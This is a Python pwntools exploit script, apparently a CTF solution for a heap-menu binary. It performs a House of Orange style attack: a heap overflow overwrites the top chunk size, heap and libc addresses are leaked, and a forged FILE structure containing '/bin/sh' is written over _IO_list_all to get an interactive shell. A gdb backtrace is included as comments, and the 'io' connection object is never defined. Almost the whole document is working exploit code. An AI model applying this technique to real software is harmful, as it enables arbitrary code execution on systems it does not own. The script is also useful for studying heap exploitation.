from pwn import *
context.log_level = 'debug'
pause()

def menu(idx):
    io.recvuntil('Your choice :')
    io.sendline(str(idx))

def Author(a):
    io.recvuntil('Author :')
    io.send(a)

def Add(sz, content):
    menu(1)
    io.recvuntil('Size of page :')
    io.sendline(str(sz))
    io.recvuntil(':')
    io.send(content)

def Edit(idx, content):
    menu(3)
    io.recvuntil(':')
    io.sendline(str(idx))
    io.recvuntil(':')
    io.send(content)

def Info():
    menu(4)

def View(idx):
    menu(2)
    io.recvuntil(':')
    io.sendline(str(idx))

Author('a' * 0x40)
Add(0x18, '0')
Edit(0, '0' * 0x18)
Edit(0, '\x00' * 0x18 + '\xe1\x0f\x00') # must use '\x00' to make g_size[0] == 0
Info()
io.recvuntil('a' * 0x40)
heap_addr = u64(io.recvuntil('\n')[:-1].ljust(8, '\x00'))
print hex(heap_addr)
io.recvuntil('? (yes:1 / no:0) ')
io.sendline('0')

for i in range(0, 8):
    Add(0x10, 'a')

View(1)
io.recvuntil('Content :\n')
libc_addr = u64(io.recvuntil('\n')[:-1].ljust(8, '\x00')) - 0x7fcd379e9161 + 0x00007fcd37625000
print hex(libc_addr)
io_list_all = libc_addr + 0x3c4520
Edit(0, '\x00' * 0x10 + (p64(0) + p64(0x21) + '0' * 0x10) * 8 + '/bin/sh\x00' + p64(0x61) + p64(io_list_all - 0x10) * 2 + p64(2) + p64(3) + p64(0) * 9 + p64(libc_addr + 0x45390) + p64(0)*11 + p64(heap_addr+0x170)) # the size must be 0x61 
pause()
#1  0x00007fddc30f4fbd in __GI_abort () at abort.c:74
#2  0x00007fddc31357ea in __libc_message (do_abort=0x2, fmt=fmt@entry=0x7fddc324eed8 "*** Error in `%s': %s: 0x%s ***\n")
#   at ../sysdeps/posix/libc_fatal.c:175
#3  0x00007fddc314013e in malloc_printerr (ar_ptr=0x7fddc3482b20 <main_arena>, ptr=0x7fddc3483520 <_IO_list_all>, 
#   str=0x7fddc324bd3f "malloc(): memory corruption", action=<optimized out>) at malloc.c:5006
#4  _int_malloc (av=av@entry=0x7fddc3482b20 <main_arena>, bytes=bytes@entry=0x100) at malloc.c:3474
#5  0x00007fddc3142184 in __GI___libc_malloc (bytes=0x100) at malloc.c:2913
#6  0x0000000000400a03 in ?? ()
menu(1)
io.recvuntil(':')
io.sendline(str(0x100))

io.interactive()

